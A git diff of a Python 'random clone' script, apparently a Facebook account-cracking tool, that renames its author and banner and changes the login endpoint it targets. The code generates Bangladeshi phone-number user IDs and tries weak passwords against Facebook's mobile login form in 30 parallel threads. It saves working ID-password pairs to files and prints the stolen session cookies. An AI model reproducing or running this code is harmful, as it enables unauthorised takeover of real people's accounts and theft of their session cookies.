@@ -1,9 +1,9 @@
 #Script         
 #    Respotary   Star  
 #----------------------------------------------------------------------------------------------------------
-#CREATE BY : DEVHIS ISLAM HIMU
+#CREATE BY : MUMIT ISLAM HIMU
 #WHATSAPP : +8801644777805
-#GITHUB : https://github.com/DEVHIS-404-CYBER
+#GITHUB : https://github.com/MUMIT-404-CYBER
 #----------------------------------------------------------------------------------------------------------
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -82,88 +82,80 @@ def __init__(self):
         self.cp = []
         self.loop = 0
         
-logo = ("""
-  \x1b[1;92m╔╗╔╗\033[0;33m╔══╗\033[0;34m╔══╗\033[0;35m╔══╗\033[0;31m╔═╦╗ \033[0;36m╔══╗\033[0;37m╔═╦═╗\x1b[1;92m╔══╗\033[0;31m╔═╦═╗
-  \x1b[1;92m║╚╝║\033[0;33m║╔╗║\033[0;34m║══╣\033[0;35m║╔╗║\033[0;31m║║║║ \033[0;36m╚║║╝\033[0;37m║║║║║\x1b[1;92m║╔╗║\033[0;31m║║║║║
-  \x1b[1;92m║╔╗║\033[0;33m║╠╣║\033[0;34m╠══║\033[0;35m║╠╣║\033[0;31m║║║║ \033[0;36m╔║║╗\033[0;37m║║║║║\x1b[1;92m║╠╣║\033[0;31m║║║║║
-  \x1b[1;92m╚╝╚╝\033[0;33m╚╝╚╝\033[0;34m╚══╝\033[0;35m╚╝╚╝\033[0;31m╚╩═╝ \033[0;36m╚══╝\033[0;37m╚╩═╩╝\x1b[1;92m╚╝╚╝\033[0;31m╚╩═╩╝\x1b[1;92m
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
-┃\033[1;31mDEVELOPER : \x1b[1;92mHASAN IMAM   ┃\x1b[1;96mTOOL : \x1b[1;92mBD/INDIA┃
-┃\033[1;31mGITHUB    : \x1b[1;92mX74TEAM      ┃\x1b[1;96mVERSION : \033[1;37m1.0\x1b[1;92m  ┃
-┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫
-┃\033[1;34mFACEBOOK  : \x1b[1;92mHASAN IMAM┃\x1b[1;96mTYPE : \033[1;37m\x1b[41mFREE\x1b[0m \x1b[1;92mRANDOM┃
-┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛\x1b[0m
-""")
-logo1 = ("""
-  \x1b[1;92m╔╗╔╗\033[0;33m╔══╗\033[0;34m╔══╗\033[0;35m╔══╗\033[0;31m╔═╦╗ \033[0;36m╔══╗\033[0;37m╔═╦═╗\x1b[1;92m╔══╗\033[0;31m╔═╦═╗
-  \x1b[1;92m║╚╝║\033[0;33m║╔╗║\033[0;34m║══╣\033[0;35m║╔╗║\033[0;31m║║║║ \033[0;36m╚║║╝\033[0;37m║║║║║\x1b[1;92m║╔╗║\033[0;31m║║║║║
-  \x1b[1;92m║╔╗║\033[0;33m║╠╣║\033[0;34m╠══║\033[0;35m║╠╣║\033[0;31m║║║║ \033[0;36m╔║║╗\033[0;37m║║║║║\x1b[1;92m║╠╣║\033[0;31m║║║║║
-  \x1b[1;92m╚╝╚╝\033[0;33m╚╝╚╝\033[0;34m╚══╝\033[0;35m╚╝╚╝\033[0;31m╚╩═╝ \033[0;36m╚══╝\033[0;37m╚╩═╩╝\x1b[1;92m╚╝╚╝\033[0;31m╚╩═╩╝\x1b[1;92m
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
-┃\033[1;31mDEVELOPER : \x1b[1;92mHASAN IMAM   ┃\x1b[1;96mTOOL : \x1b[1;92mBD/INDIA┃
-┃\033[1;31mGITHUB    : \x1b[1;92mX74TEAM      ┃\x1b[1;96mVERSION : \033[1;37m1.0\x1b[1;92m  ┃
-┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫
-┃\033[1;34mFACEBOOK  : \x1b[1;92mHASAN IMAM┃\x1b[1;96mTYPE : \033[1;37m\x1b[41mFREE\x1b[0m \x1b[1;92mRANDOM┃
-┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛""")
+logo = ("""\033[1;37m
+    _____   ___   ______  _____________   ________
+   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
+   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
+ _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
+/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/  
 
-def DEVHISx():
-	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+==================================================
+[] AUTHOR    : MUMIT ISLAM HIMU
+[] TOOLS     : RANDOM CLONE
+[] TYPE      : FREE
+[] FACEBOOK  : Mumit Islam
+[] WHATSAPP  : +8801644777805
+==================================================""")
+
+logo1 = ("""\033[1;37m
+    _____   ___   ______  _____________   ________
+   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
+   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
+ _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
+/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/  
+
+==================================================""")
+
+def mumitx():
+	print('==================================================')
+
 def Main():
         os.system("clear")
         print(logo)
-        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-        print("\033[1;92m[1] BD RANDOM CLONING")
-        print("\033[1;92m[2] INDIA RANDOM CLONING")
-        print("\033[1;92m[3] JOIN FACEBOOK GROUP")
-        print("\033[1;92m[4] FOLLOW ON FACEBOOK")
-        print("\033[1;92m[0] EXIT PROGRAMMING")
-        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-        DEVHIS =input("\n[?] Choose : ")
-        if DEVHIS in ["1","01","2"]:
+        print(" [1] RANDOM CRACK")
+        print(" [0] Exit")
+        Mumit =input("\n [?] Choose : ")
+        if Mumit in ["1","01"]:
             fuck()
-        if DEVHIS in ["3","03"]:
-            os.system('xdg-open https://www.facebook.com/group/')
-        if DEVHIS in ["4","04"]:
-        	os.system('xdg-open https://www.facebook.com/SHANTO.ID')
-        if DEVHIS in [" 0", "00"]:
+        if Mumit in [" 0", "00"]:
             exit()
         else:
             exit()
+            
 def fuck():
     user=[]
     os.system('clear')
     print(logo)
-    print('┏━[•] EXAMPLE CODE: 017, 018, 019, 016')
-    code = input('┗━[+] CHOOSE CODE : ')
+    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
+    code = input('[?] CHOOSE CODE : ')
     name = ''.join(random.choice(string.digits) for _ in range(2))
     cod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
-    print('┏━[•] EXAMPLE: 2000 3000 5000 10000 ')
-    limit = int(input('┗━[+] CHOOSE : '))
+    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('[?] CHOOSE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
     with ThreadPool(max_workers=30) as yaari:
         os.system('clear')
-        os.system('xdg-open https://github.com/X74TEAM')
         print(logo1)
         tl = str(len(user))
-        print('┏━[•] Total IDs: \033[1;37m'+tl)
-        print('\x1b[1;92m┣━[•] Your Code: \033[1;37m'+code)
-        print('\x1b[1;92m┣━[•] Process has been started')
-        print('┗━[•] Dont Use Airplane mode')
-        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        print('[+] Total ids: '+tl)
+        print("[+] Your Code: "+code)
+        print('[+] Process has been started')
+        print('[+] Use flight mode for speed up')
+        print('==================================================')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790']
-            yaari.submit(DEVHIS2,uid,pwx,tl)
-    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(' ┏━[•] Crack process has been completed')
-    print(' ┣━[•] OK Ids saved in DEVHIS-OK.txt')
-    print(' ┗━[•] CP Ids saved in DEVHIS-CP.txt')
-    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-def DEVHIS2(uid,pwx,tl):
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            yaari.submit(mumit2,uid,pwx,tl)
+    print('==================================================')
+    print(' [+] Crack process has been completed')
+    print(' [+] OK Ids saved in INNOCENT/OK.txt')
+    print(' [+] CP Ids saved in INNOCENT/CP.txt')
+    print('==================================================')
+def mumit2(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -172,9 +164,9 @@ def DEVHIS2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r\033[1;92m[INNOCENT]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://m.alpha.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -185,37 +177,36 @@ def DEVHIS2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.alpha.facebook.com',
-    'method': 'GET',
-    'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'referer': 'https://mbasic.facebook.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://m.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+    'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[1;92m[ACTIVE] {cid} | {ps} \n\033[1;37mCookie:\x1b[0m {coki}")
-                open('/sdcard/DEVHIS-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f"\033[1;92m[INNOCENT-OK] {uid}|{ps} \nCookie : {coki}")
+                open('/sdcard/INNOCENT/OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                open('/sdcard/DEVHIS-CP.txt', 'a').write( cid+' | '+uid+' | '+ps+' \n')
+                print(f"\033[1;94m[INNOCENT-CP] {cid}|{ps}")
+                open('/sdcard/INNOCENT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
